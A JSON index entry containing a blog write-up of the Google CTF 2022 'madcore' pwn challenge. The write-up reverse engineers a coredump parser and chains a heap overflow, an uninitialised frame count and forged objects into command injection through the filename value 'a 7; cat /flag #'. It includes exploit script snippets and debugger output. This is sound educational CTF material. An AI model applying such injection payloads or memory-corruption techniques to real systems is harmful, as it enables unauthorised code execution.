[ { "title": "madcore", "url": "/posts/Google-Capture-The-Flag-2022-madcore-pwn/", "categories": "writeup", "tags": "pwn, binexp, googlectf", "date": "2022-07-15 05:00:00 +0200", "snippet": "introductionmadcore was a pwn task from Google CTF 2022. It is a coredump helperthat parses the input as coredump file and produces some results.filesWe are provided with few files: Dockerfile flag ld-linux-x86-64.so.2 libc.so.6 libstdc++.so.6 madcore nsjail.cfg download: madcore.zipinterfacemadcore interface is simple. Just write bytes to it and it will count them until enough bytes is sent.➜ madcore git:(main) ✗ ./madcoreabcd # input bytesRead 5 # counts bytesso, I think it’s time to prepare a coredump file to send.coredumpwhat is coredump file? A core dump is a file containing a process’s address space (memory) when the process terminates unexpectedly. Core dumps may be produced on-demand (such as by a debugger), or automatically upon termination. Core dumps are triggered by the kernel in response to program crashes, and may be passed to a helper program (such as systemd-coredump) for further processing - Arch Linux wikiThere is an interesting post covering coredump file structure here.generate coredump fileI’ve tried to generate a coredump file by simply causing SEGFAULT in my C++ program:➜ crash git:(main) ✗ lstest.cpp➜ crash git:(main) ✗ ccat test.cpp 0001: #include &lt;iostream&gt;0002: using namespace std;0003: int main(){0004: int arr[2];0005: arr[3] = 10;0006: return 0;0007: }0008: ➜ crash git:(main) ✗ g++ test.cpp -o test➜ crash git:(main) ✗ lstest test.cpp➜ crash git:(main) ✗ ./test*** stack smashing detected ***: terminated[1] 13827 abort (core dumped) ./test➜ crash git:(main) ✗ lstest test.cppbut no coredump file is there…There were two reasons why my coredump file was not generated: core dump size limit core_pattern➜ crash git:(main) ✗ sudo sysctl -w kernel.core_pattern=core.%u.%p.%t # to enable core generationkernel.core_pattern = core.%u.%p.%t➜ crash git:(main) ✗ ulimit -c unlimited # set core dump size to unlimited➜ crash git:(main) ✗ ./test*** stack smashing detected ***: terminated[1] 14162 abort (core dumped) ./test➜ crash git:(main) ✗ ls core.1001.14162.1657865437 test test.cppThat way, I was able to generate valid coredump file to provide it to madcore. The coredump file generated that way is quite big and working on it wasprobably not the best way as I didn’t fully understand the layout of it. I spent too much time looking for correct bytes to edit…send coredump to madcoreAt first, I was sending the coredump file but the program wouldn’t stop reading bytes…I had to take a quick look at the decompiled code to see what is going on.The reading is performed in main() function, just at the beginning.buffer = (uchar *)malloc(0x1000000);memset(buffer,0,size);temp_buffer = buffer;length = 0;while (size != 0) { _length = read(0,temp_buffer,size); length = (int)_length; if (length &lt; 1) break; size = size - (long)length; temp_buffer = temp_buffer + length; printf(\"Read %d\\n\",length);}So, I have to send exactly 0x1000000 bytes. I prepared simple python script to do that easily.size = 0x1000000with open(args.CORE, \"rb\") as coredump: data = bytearray(coredump.read())data_len = len(data)assert data_len &lt; sizelog.info(f\"len: {data_len}\")io.send(data)io.send(b\"\\x00\"*(size-data_len))io.recvuntil(b\"FINISHED READING.\\n\", drop=True)io.interactive()And here is the result:➜ writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437[*] len: 507904[*] Switching to interactive mode{\"backtrace\":[[0,\"&lt;unknown&gt;\"],[2137,\"??\\n??:0:0\\n\\n\"],[438894,\"??\\n??:0:0\\n\\n\"],[438366,\"??\\n??:0:0\\n\\n\"],[438540,\"??\\n??:0:0\\n\\n\"],[438366,\"??\\n??:0:0\\n\\n\"],[153840,\"0x328\\n\"]],\"modules\":[\"/home/[REDACTED]/crash\",\"/usr/lib/x86_64-linux-gnu/ld-2.31.so\",\"/usr/lib/x86_64-linux-gnu/libc-2.31.so\"]}[*] Got EOF while reading in interactive$ We can interact with the program, let’s see what is happening inside!reverse engineeringfunctionsmain()The object Corefile is initialized with buffer just after the reading it. Then, the Corefile::Process() and Corefile::GetRegisters()functions are called.Corefile corefile = Corefile::Corefile(buffer, (long)temp_buffer - (long)buffer);corefile.Process();corefile.GetRegisters();Corefile::Corefile()The Corefile::Corefile() constructor initializes: ELFBinary object for buffer std::vector for Binary pointers std::vector for RegisterSet pointers ELFBinary object for all ELF files that is finds in the buffer std::map&lt;unsigned long, ELFBinary*&gt; - address of the ELFBinary in the buffer and address of the objectCorefile::Process()The Corefile::Process() function: iterates over all ELFBinary objects runs Corefile::ProcessLOADs() functionCorefile::ProcessLOADs()The Corefile::ProcessLOADs() function iterates over process headers and initializes Binary objects.Corefile::GetRegisters()The Corefile::GetRegisters() function iterates over all process_headers and runs Corefile::ProcessNotes() for specific headersCorefile::ProcessNotes()The Corefile::ProcessNotes() function iterates over the process memory and looks for process notes.Depending on the note type it runs different parser functions to handle them, including: Corefile::ProcessSIGINFO() Corefile::ParseNtFile() Corefile::ParseAUXV() add X86RegisterSet to list of register sets of an objectCorefile::ParseNtFile()void __thiscall Corefile::ParseNtFile(Corefile *this,elf64_note *note) { /* variables */ puVar2 = (note + (*note + 3U &amp; 0xfffffffc) + 0xc); uVar1 = *(note + 4); size = *puVar2; buffer = malloc(size &lt;&lt; 3); index = 0; local_20 = puVar2 + 2; while( true ) { if (size &lt;= (ulong)(long)index) { local_18 = ((ulong)uVar1 - 0x10) + size * -0x18; local_10 = puVar2 + 2 + size * 3; for (i = 0; (ulong)(long)i &lt; size; i = i + 1) { __s = strndup((char *)local_10,local_18); sLength = strlen(__s); local_10 = (ulong *)((long)local_10 + sLength + 1); local_18 = (local_18 - sLength) - 1; binary = (Binary *)GetBinaryContainingAddress(this,*(ulong *)((long)buffer + (long)i * 8)); if (binary != (Binary *)0x0) { Binary::SetFileName(binary,__s); } } return; } if ((ulong *)((long)puVar2 + ((ulong)uVar1 + 3 &amp; 0xfffffffffffffffc)) &lt;= local_20 + 3) break; *(ulong *)((long)index * 8 + (long)buffer) = *local_20; local_20 = local_20 + 3; index = index + 1; } return;}main() continuedHere, the initialization is done. After that, the program gets into loop that iterates over all threads:while (threads = corefile.GetNumberOfThreads(), thread_num &lt; threads) { backtrace = corefile.GetBacktrace(thread_num); registerSet = corefile.GetMappedRegisterSet(thread_num); frameCount = backtrace.GetFrameCount(); endFrameCount = frameCount; for (currFrameIdx = 0; currFrameIdx &lt; endFrameCount; currFrameIdx = currFrameIdx + 1) { callFrame.field0_0x0 = backtrace-&gt;frames[currFrameIdx].field0_0x0; callFrame.field1_0x8 = backtrace-&gt;frames[currFrameIdx].field1_0x8; callFrame.binary = backtrace-&gt;frames[currFrameIdx].binary; threads = callFrame.GetSP(); binary = (Binary *)callFrame.GetBinary(); Symbolizer::Symbolizer(local_298,binary,threads); Symbolizer::Symbolicate[abi:cxx11](); mappedAddr = callFrame.GetMappedAddress(); /* * push a result with address to std::vector, pseudocode: */ new_pair = std::make_pair&lt;ulong, string&gt;(mappedAddr, str); std::vector::push_back(new_pair); } thread_num = thread_num + 1;}Corefile::GetBacktrace()The Corefile::GetBacktrace() function: initializes StackWalker object runs StackWalker::GetBacktrace() function runs Backtrace::GetFrameCount() function and logs the frameCountStackWalker::GetBacktrace()Backtrace * __thiscall StackWalker::GetBacktrace(StackWalker *this, ulong address) { /* variables */ backtrace = (Backtrace *)operator.new(0xc0); Backtrace::Backtrace(backtrace, address); binaryWithAddr = (Binary *)this-&gt;corefile.GetBinaryContainingAddress(address); tempAddr = address; if (binaryWithAddr != (Binary *)0x0) { while (isContain = (bool)binaryWithAddr.ContainsVirtualAddress(tempAddr), isContain == true) { vAddr = Binary::GetVirtualAddress(binaryWithAddr); coreAddr = binaryWithAddr.GetCore(); addrInCore = *(coreAddr + (tempAddr - vAddr &amp; 0xfffffffffffffff8)); binaryWithNewAddr = this-&gt;corefile.GetBinaryContainingAddress(addrInCore); if ((binaryWithNewAddr != (Binary *)0x0) &amp;&amp; binaryWithNewAddr.IsExecutable() == true)) { backtrace.PushModule(binaryWithNewAddr, addrInCore, tempAddr - address); } tempAddr = tempAddr + 8; } } return backtrace;}Binary::IsExecutable()bool __thiscall Binary::IsExecutable(Binary *this) { return (this-&gt;memoryProtections &amp; 1) != 0;}Backtrace::Backtrace()void __thiscall Backtrace::Backtrace(Backtrace *this, ulong address) { /* variables */ this-&gt;address = address; std::optional&lt;unsigned_int&gt;::optional(); tmpThis = (CallFrame *)this; for (offset = 6; tmpThis = (CallFrame *)(tmpThis + 0x18), -1 &lt; offset; offset = offset + -1) { CallFrame::CallFrame(tmpThis); } memset(this-&gt;frames, 0, 0xa8); return;}Backtrace::PushModule()void __thiscall Backtrace::PushModule(Backtrace *this, Binary *binary, ulong addrInCore, ulong offset) { /* variables */ hasValue = this-&gt;frameCount.has_value(); if (hasValue != true) { initValue = 1; this-&gt;frameCount = initValue; } maxValue = 6; if (this-&gt;frameCount &lt;= maxValue) { frameCount = this-&gt;frameCount.value(); newFrameCount = frameCount + 1; this-&gt;frameCount = newFrameCount; vAddr = binary.GetVirtualAddress(); currFrame = CallFrame::CallFrame(offset, addrInCore - vAddr, binary); frameCount = *this-&gt;frameCount; frameIdx = frameCount - 1; this-&gt;frames[frameIdx].field0_0x0 = currFrame.field0_0x0; this-&gt;frames[frameIdx].field1_0x8 = currFrame.field1_0x8; this-&gt;frames[frameIdx].binary = currFrame.binary; } return;}Backtrace::GetFrameCount()uint __thiscall Backtrace::GetFrameCount(Backtrace *this) { uint *frameCountPtr; frameCountPtr = *this-&gt;frameCount; return *frameCountPtr;}Symbolizer::Symbolicate()This is probably the most juicy part of the code because of that part:length = snprintf((char *)0x0, 0, \"%s --obj=%s %p\", \"llvm-symbolizer\", binaryName, offset);commandBuf = (char *)malloc((long)(length + 1));binaryName = binary.GetFileName();snprintf(commandBuf, length + 1, \"%s --obj=%s %p\", \"llvm-symbolizer\", binaryName, offset);popen(commandBuf, \"r\");The function inserts the binary name to the command and executes it. We will win if we make Binary::GetFileName() return something like this:a 0x1; cat /flag # because the executed command will look like this:$ llvm-symbolizer --obj=a 0x1; cat /flag # $offsetand the program is later returning to us the output of the function, so flag would be there! It is indeed possible to simply overwrite the filename in the coredump file but this is unintended solution, so no fun.In order to proceed with the writeup we have to assume the program is validating the filename when parsing coredump filefor example by checking if the file exists.vulnerabilitiesCorefile::ParseNtFile()The Corefile::ParseNtFile() function calls malloc(size &lt;&lt; 3) where size is taken directly from coredump file.The means we are able to cause Integer Overflow here.#include &lt;utility&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;optional&gt;using namespace std;int main (int argc, char *argv[]) { ulong test = 0x2000000000000000; printf(\"0x%lx vs 0x%lx\\n\", test, test&lt;&lt;3); return 0;}➜ tests git:(main) ✗ g++ int_overflow.cpp -std=c++17 -o int_overflow➜ tests git:(main) ✗ ./int_overflow0x2000000000000000 vs 0x0considering the fact that allocated chunk is later used to copy data from coredump file into it and the size is used to determinehow much data to copy - we have Heap Overflow here with ability to overwrite memory with whatever we want (buffer is under our control).Backtrace::GetFrameCount()The function is not vulnerable by it’s own. It is the design which can cause vulnerabilities wherever this function is used.Backtrace::frameCount is of type std::optional&lt;unsigned int&gt; which means that the value can be uninitialized in some cases.However, the function Backtrace::GetFrameCount() doesn’t check whether std::optional::has_value().In that case, the caller would be responsible for checking if the value is initialized.The frameCount is fetched in three places: Backtrace::PushModule() hasValue = this-&gt;frameCount.has_value();if (hasValue != true) { initValue = 1; this-&gt;frameCount = initValue;} the function correctly checks if the frameCount is initialized with a value. Otherwise, it initializes the frameCount with 1. Corefile::GetBacktrace() frameCount = Backtrace::GetFrameCount(backtrace);clog(frameCount); the function doesn’t check if the frameCount is initialized, nothing interesting as it just logs the value. main() frameCount = backtrace.GetFrameCount();endFrameCount = frameCount;for (currFrameIdx = 0; currFrameIdx &lt; endFrameCount; currFrameIdx = currFrameIdx + 1) { callFrame.field0_0x0 = backtrace-&gt;frames[currFrameIdx].field0_0x0; callFrame.field1_0x8 = backtrace-&gt;frames[currFrameIdx].field1_0x8; callFrame.binary = backtrace-&gt;frames[currFrameIdx].binary; threads = callFrame.GetSP(); binary = (Binary *)callFrame.GetBinary(); Symbolizer::Symbolizer(local_298,binary,threads); Symbolizer::Symbolicate[abi:cxx11](); the function doesn’t check if the frameCount is initialized and gets into a loop where number of iterations is equal to frameCount.The for loop iterates over Backtrace::frames list of CallFrame structures.It then gets the binary address for CallFrame structure and passes it to Symbolizer. Ther is only one puzzle missing. How the initialization of frameCount is performed:Backtrace::Backtrace()void __thiscall Backtrace::Backtrace(Backtrace *this, ulong address) { /* variables */ this-&gt;address = address; std::optional&lt;unsigned_int&gt;::optional(std::nullopt_t); /* not important code */}if basically calls a std::optional&lt;unsigned_int&gt; constructor with std::nullopt_t without setting the value.I decided to manually overwrite the memory before initialization of std::optional and check what value will Backtrace::GetFrameCount() return in main. Set the breakpoint to Backtrace::Backtrace() constructor pwndbg&gt; b Backtrace::Backtrace(unsigned long) Breakpoint 5 at 0x71f8 (2 locations) Overwrite the memory pwndbg&gt; p/x $rdi # get address of Backtrace object$1 = 0x562592378e00pwndbg&gt; set {long}(0x562592378e00+0x10)=0xdeadbeefcafebabe # overwrite the memory Compare memory before and after calling constructor # step until std::optional constructor is calledpwndbg&gt; x/10xg 0x562592378df00x562592378df0:\t0x000000006f732e31\t0x00000000000000d1 # beginning of Backtrace object0x562592378e00:\t0x00007ffc0b3e1d90\t0x00000000000000000x562592378e10:\t0xdeadbeefcafebabe\t0x0000000000000000 # overwritten memory# step out of the constructorpwndbg&gt; x/10xg 0x562592378df00x562592378df0:\t0x000000006f732e31\t0x00000000000000d1 # beginning of Backtrace object0x562592378e00:\t0x00007ffc0b3e1d90\t0x00000000000000000x562592378e10:\t0xdeadbe00cafebabe\t0x0000000000000000 # overwritten memory0x562592378e20:\t0x0000000000000000\t0x00000000000000000x562592378e30:\t0x0000000000000000\t0x0000000000000000 The bytes at offset 4 was set to 0x00 and nothing more. This is the byte used to determine if the std::optional object has a value.exploitationanalysis summary We want to trick the program into executing command with malicious filename but we are not able to simply pass it from coredump file We have heap overflow in Corefile::ParseNtFile() The Backtrace::GetFrameCount() can return uninitialized value and the loop in main relies on the value The Backtrace::PushModule() function initializes the value of frameCountidea Abuse the heap overflow in order to overwrite the memory that will later be used for std::optional. Initialize the Backtrace object Avoid calling Backtrace::PushModule() from StackWalker::GetBacktrace()If we manage to execute those steps we will have control over the frameCount. It is important to remember where it is used:frameCount = backtrace.GetFrameCount();endFrameCount = frameCount;for (currFrameIdx = 0; currFrameIdx &lt; endFrameCount; currFrameIdx = currFrameIdx + 1) { callFrame.field0_0x0 = backtrace-&gt;frames[currFrameIdx].field0_0x0; callFrame.field1_0x8 = backtrace-&gt;frames[currFrameIdx].field1_0x8; callFrame.binary = backtrace-&gt;frames[currFrameIdx].binary; threads = callFrame.GetSP(); binary = (Binary *)callFrame.GetBinary(); Symbolizer::Symbolizer(local_298,binary,threads); Symbolizer::Symbolicate[abi:cxx11]();class Binary { uint64_t core; uint64_t size; char[64] fileName; uint64_t virtualAddress; uint64_t memoryProtections;};class CallFrame { uint64_t field0; uint64_t field1; Binary* binaryAddr;};class Backtrace { uint64_t address; uint64_t field1; std::optional&lt;unsigned_int&gt; frameCount; CallFrame[6] callFrame;};If frameCount will return value bigger than 6 we would have OOB read. We could abuse that to trick program into reading our fake CallFrame objectthat would have set binaryAddr to fake Binary object with malicious filename.implementationIt’s time to implement steps from idea in order to successfully exploit the vulnerabilities.Heap overflow0x5647a04a5620:\t0x0000000000000000\t0x0000000000000101 ===&gt; allocated buffer0x5647a04a5630:\t0x000055cf2f7b8000\t0x000055cf2f7b90000x5647a04a5640:\t0x000055cf2f7ba000\t0x000055cf2f7bb0000x5647a04a5650:\t0x000055cf2f7bc000\t0x00007efca35920000x5647a04a5660:\t0x00007efca3595000\t0x00007efca35a70000x5647a04a5670:\t0x00007efca35ab000\t0x00007efca35ac0000x5647a04a5680:\t0x00007efca35ad000\t0x00007efca35ba0000x5647a04a5690:\t0x00007efca3661000\t0x00007efca36fa0000x5647a04a56a0:\t0x00007efca36fb000\t0x00007efca36fc0000x5647a04a56b0:\t0x00007efca371e000\t0x00007efca38960000x5647a04a56c0:\t0x00007efca38e4000\t0x00007efca38e80000x5647a04a56d0:\t0x00007efca38ee000\t0x00007efca39840000x5647a04a56e0:\t0x00007efca3a75000\t0x00007efca3abe0000x5647a04a56f0:\t0x00007efca3abf000\t0x00007efca3aca0000x5647a04a5700:\t0x00007efca3af4000\t0x00007efca3af50000x5647a04a5710:\t0x00007efca3b18000\t0x00007efca3b210000x5647a04a5720:\t0x00007efca3b22000\t0x0000000000000051 ===&gt; binary filename0x5647a04a5730:\t0x44442f656d6f682f\t0x44444444444444440x5647a04a5740:\t0x4444444444444444\t0x44444444444444440x5647a04a5750:\t0x4444444444444444\t0x44444444444444440x5647a04a5760:\t0x4444444444444444\t0x68736172632f4444...0x5647a04a5dc0:\t0x000000006f732e31\t0x0000000000000031 ===&gt; binary filename0x5647a04a5dd0:\t0x62696c2f7273752f\t0x2d34365f3638782f0x5647a04a5de0:\t0x6e672d78756e696c\t0x332e322d646c2f750x5647a04a5df0:\t0x000000006f732e31\t0x00000000000000d1 ===&gt; Backtrace object0x5647a04a5e00:\t0x00007ffc0b3e1d90\t0x0000000000000000 ================================ std::optional&lt;unsigned_int&gt; initialized = 0x01 and value = 0x07 \\/0x5647a04a5e10:\t0xafaa1a0100000007\t0x00000000000000000x5647a04a5e20:\t0x0000000000000000\t0x00000000000000000x5647a04a5e30:\t0x0000000000000118\t0x00000000000008590x5647a04a5e40:\t0x00005647a04a49a0\t0x00000000000002480x5647a04a5e50:\t0x000000000006b26e\t0x00005647a04a49a00x5647a04a5e60:\t0x00000000000002a8\t0x000000000006b05e0x5647a04a5e70:\t0x00005647a04a49a0\t0x00000000000002c80x5647a04a5e80:\t0x000000000006b10c\t0x00005647a04a49a00x5647a04a5e90:\t0x00000000000002e8\t0x000000000006b05e0x5647a04a5ea0:\t0x00005647a04a49a0\t0x00000000000003280x5647a04a5eb0:\t0x00000000000258f0\t0x00005647a04a4c400x5647a04a5ec0:\t0x0000000000000000\t0x000000000000c141 ===&gt; top chunkthe layout: our allocated chunk all binary filenames from Corefile::ParseNtFile() Backtrace object we want to overwritehowever, the layout will be different if we pass huge size as this is the condition that has to be fulfilled in order to allocate all filename chunks:if (size &lt;= index)so, if size will be huge, the Backtrace chunk will land just after the allocated chunk. We just have to make sure the top chunk size bytes won’t change becauseotherwise next malloc() call will crash. As I am not really familiar with coredump file structure, I added breakpoint in Corefile::ParseNtFile() functionand looked for offset where the elf64_note lies. the RSI register contained address that is placed at offset 0xd68 of coredump file buffer. malloc() was invoked with value 0xf8 so the initial size is: 0xf8 &gt;&gt; 3 = 0x1fI opened the coredump file in nvim using command: $ nvim -b core and :%!xxd inside nvim to edit it in more human-friendly format.It was quite easy to find the correct offset:00000d60: 0000 0000 0000 0000 0500 0000 7108 0000 ............q... ============== size \\/00000d70: 454c 4946 434f 5245 0000 0000 1f00 0000 ELIFCORE........00000d80: 0000 0000 0010 0000 0000 0000 0080 7b2f ..............{/and replace the value with 0x2000000000000020.To save the file in nvim we have to execute :%!xxd -r and :w to write the file.00000d60: 0000 0000 0000 0000 0500 0000 7108 0000 ............q... ===============================\\ \\___ ____ \\ size00000d70: 454c 4946 434f 5245 0000 0000 2000 0000 ELIFCORE.... ... / 0x2000000000000020 ====================================================/ ____ ___/00000d80: 0000 0020 0010 0000 0000 0000 0080 7b2f ... ..........{/and after running the program with a changed size:➜ writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437 [*] len: 507904[*] Switching to interactive modemalloc(): corrupted top size[*] Got EOF while reading in interactiveLast step here will be finding offset of the data that overwrites the top chunk size and replace it with value 0xc8d1(the size after malloc() is invoked in the Corefile::ParseNtFile()).I found it simply by: find address of top chunk after malloc() call in Corefile::ParseNtFile() check the value of that address after Corefile::ParseNtFile() function returns find first occurence of that value in coredump fileprobably this is not 100% working solution, but worked for me. The value will be after offset (0xd68) at which the size was located.And this is the result:➜ writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437 [*] len: 507904[*] Switching to interactive mode{\"backtrace\":[[0,\"&lt;unknown&gt;\"],[2137,\"0x118\\n\"],[438894,\"0x248\\n\"],[438366,\"0x2a8\\n\"],[438540,\"0x2c8\\n\"],[438366,\"0x2e8\\n\"],[153840,\"0x328\\n\"]],\"modules\":[]}[*] Got EOF while reading in interactiveLet’s check the value of frameCount before running Backtrace::PushModule(): set breakpoint to Backtrace::PushModule() Get the address from RDI register (address of Backtrace object) print the value of frameCount: pwndbg&gt; x/xw $rdi+0x10 # value0x5626f73fc750:\t0x742f6572pwndbg&gt; x/xb $rdi+0x10+0x4 # has_value0x5626f73fc754:\t0x00 Backtrace initializationThis step is easy as the Backtrace is initialized unconditionally.Avoid Backtrace::PushModule()In order to avoid calling Backtrace::PushModule() we need to analyze the code that runs it:if ((binaryWithNewAddr != (Binary *)0x0) &amp;&amp; binaryWithNewAddr.IsExecutable() == true)) { backtrace.PushModule(binaryWithNewAddr, addrInCore, tempAddr - address);}We have to change memory protections of all binaries in coredump file to have lowest bit set to 0 and the condition will never be true.It was really easy to do in nvim, just: open it in binary mode: $ nvim -b core use :%!xxd to move to human-friendly format select the memory at the beginning that contains all elf64_phdr entries replace all 0500 characters with 0400 : :'&lt;,'&gt;s/0500 /0400 /gand here is the result:➜ writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437 [*] len: 507904[*] Switching to interactive modeLLVMSymbolizer: error reading file: No such file or directory[*] Got EOF while reading in interactivefake objectsdebuggingLet’s check with gdb what is going on inside Set breakpoint at Backtrace::GetFrameCount() to check the returned value:Backtrace::GetFrameCount() returns 0x742f6572 value - success Set breakpoint to Binary::GetFileName() to check which CallFrame makes it to Symbolizer::Symbolicate()preparing memory layoutIt turns out that the Backtrace::frames array is empty and the first non-empty element that is treated as CallFrame element is insideMappedRegisterSet object allocated just after the Backtrace object.Lucky for us, we have almost full control over the content of that class. We cannot change the first qword of that class as this is vpointer.However, we can change every next byte of that class.register values are stored at offset 0x70 and I think that data between vpointer and registers is either unused or just copies the memory from coredump file.X86RegisterSet * __thiscall X86RegisterSet::GetRegisters(X86RegisterSet *this) { return this + 0x70;}Due to popen() call inside the program, it was hard to debug what happens after first Symbolizer::Symbolicate() run. Here, the coredump files come to the rescue!➜ writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437[*] len: 507904[*] Switching to interactive modeLLVMSymbolizer: error reading file: No such file or directory[*] Got EOF while reading in interactive$ ➜ writeup git:(main) ✗ ls | grep corecore.1001.182319.1658134823madcore➜ writeup git:(main) ✗ gdb -c core.1001.182319.1658134823 madcorepwndbg&gt; info registersrax 0x57e 1406rbx 0x73 115rcx 0x1 1rdx 0x2d6362696c2f757e 3270565959327249790rsi 0x7f41254479ab 139917774846379rdi 0x2d6362696c2f757e 3270565959327249790rbp 0x7ffcc8bd0040 0x7ffcc8bd0040rsp 0x7ffcc8bcfad8 0x7ffcc8bcfad8r8 0x7f412556f040 139917776056384r9 0x7f412556f0c0 139917776056512r10 0x7f412556efc0 139917776056256r11 0x0 0r12 0x16 22r13 0x2d6362696c2f757e 3270565959327249790r14 0x0 0r15 0x7ffcc8bd01c0 140723676316096rip 0x7f412553cd99 0x7f412553cd99eflags 0x10283 [ CF SF IF RF ]cs 0x33 51ss 0x2b 43ds 0x0 0es 0x0 0fs 0x0 0gs 0x0 0pwndbg&gt; x/10i $pc=&gt; 0x7f412553cd99:\tvpcmpeqb ymm1,ymm0,YMMWORD PTR [rdi] 0x7f412553cd9d:\tvpmovmskb eax,ymm1 0x7f412553cda1:\ttest eax,eax 0x7f412553cda3:\tje 0x7f412553ce00 0x7f412553cda5:\ttzcnt eax,eax 0x7f412553cda9:\tvzeroupper 0x7f412553cdac:\tret 0x7f412553cdad:\tnop DWORD PTR [rax] 0x7f412553cdb0:\ttzcnt eax,eax 0x7f412553cdb4:\tsub edi,edxThe failing instruction is inside sprintf() call.It comes out the value under RDI register is the value from next fake CallFrame after vpointer plus 0x10 (offset at which the Binary::fileName should be).Conclusion: Memory layout we want to prepare needs to contain only valid addresses at offsets representing CallFrame::binaryAddr - but… how to do that without leaks?Here, the functionality of madcore comes to the rescue:if (binaryPtr != (Binary *)0x0) { mappedRegisterSet.GetRAX(); core = binaryPtr-&gt;GetCore(); raxPtr = mappedRegisterSet.GetRAX(); rax = *raxPtr; vaddr = binaryPtr-&gt;GetVirtualAddress(); mappedRegisterSet.GetRAX(); *raxPtr = core + (rax - vaddr); mappedRegisterSet.GetRAX(); vaddr = binaryPtr-&gt;GetVirtualAddress();}this code basically translates address from coredump to address of chunk allocated for coredump buffer during madcore program execution, meaning that the program willmake the address valid for us. This is what we have to do now: Clean the memory to have 0x00 at offsets corresponding to CallFrame::binaryAddrThe code that can help with finding them is: *(index * 8 + buffer) = *memoryPtr;memoryPtr = memoryPtr + 3; // here it's memoryPtr + 0x18 but memoryPtr is of type ulong*index = index + 1; because the offset between next values to zero-out is 0x18 * 0x3 = 0x48 Find register which is placed at the correct offset and set it’s value to valid address from coredump perspective that will be then translated to valid address.In my case it was R14 which was at offset 0x8 (so registers[1]). It was pointing at offset 0x40000:0x55c516ae1800:\t0x696c2f756e672d78\t0x0000000000000121 ===&gt; MappedRegisterSet0x55c516ae1810:\t0x000055c516073ac8\t0x00007fe9b008f9940x55c516ae1820:\t0x0000000000000150\t0x00000000000000000x55c516ae1830:\t0x2d34365f3638782f\t0x2f006f732e31332e0x55c516ae1840:\t0x0000000000000000\t0x782f62696c2f72730x55c516ae1850:\t0x332e322d6362696c\t0x00000000000000000x55c516ae1860:\t0x7273752f006f732e\t0x696c2f756e672d780x55c516ae1870:\t0x0000000000000000\t0x7362696c2f756e670x55c516ae1880:\t0x0000000000000001\t0x00007fe9b00cf010 ===&gt; registers[0] registers[1] &lt;=== R14 with valid address0x55c516ae1890:\t0x0000000000000020\t0x00007fe9b00f20200x55c516ae18a0:\t0x00007fe9b00f2120\t0x00007fe9b00b7f500x55c516ae18b0:\t0x0000000000000146\t0x00000000000000080x55c516ae18c0:\t0x00007fe9b00f1da0\t0x00000000000000000x55c516ae18d0:\t0x0000000000000000\t0x00007fe9b00e101b0x55c516ae18e0:\t0x0000000000000000\t0x00007fe9b00f1da00x55c516ae18f0:\t0x0000000000000002\t0x000000000000000e0x55c516ae1900:\t0x00007efca373f00b\t0x00000000000000330x55c516ae1910:\t0x0000000000000246\t0x00007fe9b00f1da00x55c516ae1920:\t0x000000000000002b\t0x0000000000000031pwndbg&gt; vmmap 0x00007fe9b00cf010LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x7fe9b008f000 0x7fe9b1094000 rw-p 1005000 0 [anon_7fe9b008f] +0x40010 &lt;=== offset is reduced by 0x10 == 0x40000 Overwrite the memory at offset+0x10 to the malicious Binary::fileName00040000: 902b aca3 fc7e 0000 b0c4 9ba3 fc7e 0000 .+...~.......~..00040010: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA00040020: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA00040030: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA00040040: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA Replace A characters with malicious command in solve.pyto_replace = b\"A\"*64lngth = len(to_replace)payload = b\"a 7; cat /flag #\"payload = payload.ljust(lngth, b\"a\")data = data.replace(to_replace, payload) Fix last bug:As the frameCount is huge, the loop executing Symbolizer::Symbolicate() won’t stop after our fake CallFrame but will go further. This will end with SEGFAULTor other errors and as a result the JSON with outputs won’t be printed and we won’t see the output of command. In order to fix that I specified the frameCount valuethat will cause the loop to finish just after fake CallFrame. This is fairly easy, as we know the current value (0x742f6572) and we know it is 0x18 * 0x3 = 0x48after the top chunk size we already written into our coredump file.The value frameCount == 0xd returned following result:➜ writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437[*] len: 507904[*] Switching to interactive modeLLVMSymbolizer: error reading file: No such file or directoryLLVMSymbolizer: error reading file: No such file or directory{\"backtrace\":[[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[289,\"??\\n??:0:0\\n\\n\"],[336,\"&lt;unknown&gt;\"],[3386829460269511470,\"&lt;unknown&gt;\"],[3687940315385325932,\"&lt;unknown&gt;\"],[7596498852877118840,\"&lt;unknown&gt;\"],[1,\"??\\n??:0:0\\n\\nCTF{TEST_FLAG}\\n\"]],\"modules\":[]}[*] Got EOF while reading in interactive$ and on remote:➜ writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437 REMOTE[+] Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done[*] len: 507904[*] Switching to interactive mode{\"backtrace\":[[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[0,\"&lt;unknown&gt;\"],[289,\"\"],[336,\"&lt;unknown&gt;\"],[3386829460269511470,\"&lt;unknown&gt;\"],[3687940315385325932,\"&lt;unknown&gt;\"],[7596498852877118840,\"&lt;unknown&gt;\"],[1,\"CTF{w4y_cpp_g0tta_be_like_that_can_we_get_a_good_STLPLS}\\n\"]],\"modules\":[]}[*] Got EOF while reading in interactive$ " } ]
